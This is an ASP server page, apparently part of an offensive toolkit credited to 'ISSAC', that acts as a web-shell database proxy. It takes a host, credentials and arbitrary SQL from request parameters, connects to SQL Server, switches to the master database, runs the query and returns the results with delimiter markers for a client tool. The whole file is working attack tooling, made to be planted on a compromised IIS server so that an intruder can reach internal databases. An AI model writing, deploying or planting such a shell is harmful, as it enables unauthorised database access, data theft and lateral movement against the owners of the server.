<%
'Powered by ISSAC
'https://github.com/malbuffer4pt/IssacTools
'Environment : Windows 11, IIS 10.0, SQL Server 2022

Set Conn=Server.CreateObject("Adodb.connection")
Dim conn_str,host,db,user,pass,sql
host = Request("host")
db = Request("db")
user = Request("user")
pass = Request("pass")
sql = Request("sql")
conn_str = "Driver={Sql Server};Server={"&host&"};Database={"&db&"};Uid={"&user&"};Pwd={"&pass&"}"
Conn.Open conn_str
If Err Then
    Response.Write "ERROR://"&Err.Description
    Err.Clear
Else
    Response.Write("Connect successfully![MSG]")
    Conn.Execute("USE [master]")
    Set Rs=Conn.Execute(sql)
    If Err Then
        Response.Write "ERROR://"&Err.Number&":"&Err.Description
        Err.Clear
    Else
        Dim FN
        FN=Rs.Fields.Count-1
        For n=0 To FN
            Response.Write Rs.Fields.Item(n).Name&"|"
        Next
        Response.Write("[COLUMN_SPLIT]")
        Response.Write RN
        Do While Not(Rs.Eof Or Rs.Bof)
            For n=0 To FN
                Response.Write Rs(n)
                Response.Write "|"
            Next
            Response.Write "[ROW_SPLIT]"
            Rs.MoveNext
        Loop
    End If
    Set Rs=Nothing
    Conn.Close
End If
Set Conn=Nothing
%>